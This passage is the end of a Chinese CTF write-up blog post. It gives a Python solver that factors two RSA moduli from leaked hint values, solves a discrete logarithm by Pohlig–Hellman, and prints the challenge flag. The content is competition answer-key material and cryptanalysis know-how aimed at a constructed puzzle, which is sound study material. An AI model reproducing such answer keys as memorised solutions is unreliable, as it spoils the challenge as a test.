\pmod n$</p><p>同题 Number theory，数论+DLP（Pohlig–Hellman）求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babystep_giantstep</span>(<span class="params">g, y, p, q=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> q <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        q = p - <span class="number">1</span></span><br><span class="line">    m = <span class="built_in">int</span>(q**<span class="number">0.5</span> + <span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># Baby step</span></span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    gr = <span class="number">1</span>  <span class="comment"># g^r</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        table[gr] = r</span><br><span class="line">        gr = (gr * g) % p</span><br><span class="line">    <span class="comment"># Giant step</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        gm = <span class="built_in">pow</span>(g, -m, p)  <span class="comment"># gm = g^&#123;-m&#125;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    ygqm = y                <span class="comment"># ygqm = y * g^&#123;-qm&#125;</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> ygqm <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">return</span> q * m + table[ygqm]</span><br><span class="line">        ygqm = (ygqm * gm) % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pohlig–Hellman法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pohlig_hellman_DLP</span>(<span class="params">g, y, p</span>):</span><br><span class="line">    crt_moduli = []</span><br><span class="line">    crt_remain = []</span><br><span class="line">    <span class="keyword">for</span> q, _ <span class="keyword">in</span> factor(p-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> q &lt; <span class="number">10</span>^<span class="number">7</span>:</span><br><span class="line">            x = babystep_giantstep(<span class="built_in">pow</span>(g,(p-<span class="number">1</span>)//q,p), <span class="built_in">pow</span>(y,(p-<span class="number">1</span>)//q,p), p, q)</span><br><span class="line">            <span class="keyword">if</span> (x <span class="keyword">is</span> <span class="literal">None</span>) <span class="keyword">or</span> (x &lt;= <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crt_moduli.append(q)</span><br><span class="line">            crt_remain.append(x)</span><br><span class="line">    x = crt(crt_remain, crt_moduli)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">c = <span class="number">0x639cd472630afb1aa9f5490b4f3de3b4701eef5c61aad06345f9e001021340cf989fc082693f745716bd39d015793e62be08913dcb82b2b6c8ed56d15a4cc230a60ea185d593a858b47276c403c79b6da23b561b200295a8addba7a48660d17a9eef322e430b939aecc4ca0c0f4fcc003524cdca68b7be935962f4b4ad8cafd5</span></span><br><span class="line">n1 = <span class="number">0x11df715605906c9cfc906faf4d02a380b9489fe890952cfbc7713af87031b61a4a3a0e2c46ba89ef462a3a77def7d5de0a0a10b3d1303afc06ed7bc9f07e01e9883b06ce17c290fe550844cf9028f50642e4190ccb13cdf0bb0493e437c54ee17643202cc1b35741208957eb6c1843299b4480e6d32a311de6fd6f4b9d9e8fab</span></span><br><span class="line">c1 = <span class="number">0x5a768e8e3e4efe51f566d77dd9a1312f5398bc9e1fa4e828be6a3b6aa6109de02c4eec524e23bf0836b7b25f534a429744e980bdc3acd77a8133c543ea1cf4f4665fbd46bc21d38edd60a687007e079980cac97e1099610aeceee3bff13483396a4cfb061df7d5bce9c7fba6ae14fbead5f56aa990f23ee9cbe8a8fc066d5fa</span></span><br><span class="line">e1 = <span class="number">39847</span></span><br><span class="line">h1 = <span class="number">0xc3fd84beeb2363d414848fda5898976625bcbb9637982f83853a6c96e64c8ec94645409b7036e3b187ecf930e294fc448c4ac6bfa9945078300b1619bc98d13275770f562874c7fd389ba9ef4e05019633566e65ba95e5a30e29a45b79774c6aaed89aa43105508e868941c81861120f50fe182e33b80701e1714205759f380</span></span><br><span class="line">n2 = <span class="number">0x3cc006e0dea07f834418109ac8c1a447258c7da01223107fd255303613ce9ffc3faa74823a28ea1e211a34c349f20b49bb00447777e4d7f5139219e62fb993562f7e705e0919ccbc414956e8a6cc3e01812ca6eb10558060fe0f7c06da63e5d6169ea5790e86f3e2e804d399d1429529d3031738f134e619a0decce12bde4cd</span></span><br><span class="line">c2 = <span class="number">0x2de5d5191bf279ba3ea338bd4390a18d0233da9e050b3aa2644a9427eff787b4d74aa3c7dc348f214247997ae32fb86428935e61234f9ef63e9b562c40b6b07c9133cad4672c9aa7f515d3f7d067b6187d30e4346c4afeceae031c3116ccf97acaddb2af42d459c61ce0df7b56ce1e0ba15cf28aed5415615aa9398fb494e5b</span></span><br><span class="line">e2 = <span class="number">44021</span></span><br><span class="line">h2 = <span class="number">0x2dd30b086f1c8fa7860ed5cde1e02a062e8722ae9823579f764d5da86ec250b2dfee6934463a06b133d791c3cfbe5f88a43bfae7f25cfb3efb61c10aa710aa76e2229241986fb16f1ae34a867cb7ba641d5637b70a92027479e9c18d1372059a4e04a7298c5b279fa6d84abc1b466b29bba8a1a2ea9e8ad568c14af17c4f50e</span></span><br><span class="line">h3 = <span class="number">0x35751402de3cb0f6481451a7b3665b3ddd15c9f0ad07398c4ee35c01ff926dd2545dc41d591fca58b485e3cd114d7c0a67196f95fcebc9391f10c89ded2b1ef3e5014ab8fe5ea33e2afb1cd9af7d84fca17e56e759b136578c29f679a64f0e2060492eee268af2304f7c689ece60a941ba8100dd0d2af1a45499afd10cf9eaa</span></span><br><span class="line"></span><br><span class="line">p1 = GCD(n1, <span class="built_in">pow</span>(<span class="number">2024</span>,n1,n1)-h1)</span><br><span class="line">q1 = n1 // p1</span><br><span class="line">f1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d1 = inverse(e1,f1)</span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">pow</span>(c1,d1,n1))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">A1 = <span class="number">2023</span></span><br><span class="line">B1 = <span class="number">2024</span></span><br><span class="line">A2 = <span class="number">2024</span></span><br><span class="line">B2 = <span class="number">2023</span></span><br><span class="line">ea = <span class="number">2323</span></span><br><span class="line">eb = <span class="number">2424</span></span><br><span class="line">t1 = <span class="built_in">pow</span>(A1, ea*eb, n2)</span><br><span class="line">t2 = <span class="built_in">pow</span>(A2, ea*eb, n2)</span><br><span class="line">temp1 = t2 * <span class="built_in">pow</span>(h2, eb, n2)</span><br><span class="line">temp2 = t1 * <span class="built_in">pow</span>(h3, ea, n2)</span><br><span class="line"></span><br><span class="line">p2 = GCD(temp1-temp2, n2)</span><br><span class="line">q2 = n2 // p2</span><br><span class="line">f2 = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse(e2,f2)</span><br><span class="line">q = <span class="built_in">int</span>(<span class="built_in">pow</span>(c2,d2,n2))</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line">a = <span class="number">0xc028af32e59098f182059e09d4463c34a71b5db98d0d538305102ce68cda72f6897606fd8d933b51633e63c63be59cc3454e8d04d287eda3535f21a8c9496f9e5b62edc81eb971d55b9ecc20b4d6671709e73af110d1bef9413e9786032d268fd7d243d01ccbdbeb0757e5a5affbc976e83f85bde685618d592fe23d754919a2</span></span><br><span class="line">g = <span class="number">0x488d156b0cbef000f1bf6c47006a3595</span></span><br><span class="line">n = <span class="number">0x9c5ab7c1cc9a4f60b1d53afafd7016d00e811e5a1c6fb258c75a246a0630a75644100828e21757de1d9a5ff99ebd05257aa9d895c1de40a2eb619fa52f32b38acb52669841d528351df863137b0a14f4aff6506cf0c7cdf1801c2bd3d7fb4e583811f4f771f7e5c0e5f42a85839affed38df8b913fa6a4e782adc028e5e86162f</span></span><br><span class="line">e = pohlig_hellman_DLP(g, a, n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(g,e,n) == a</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;IKnowYouLikeReverseAndCrypto&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2024/12/08/match-2024-HECTF/" title="2024 HECTF"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2024/03/11/match-HSCCTF-2024/" title="HSCCTF 2024"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script></body></html>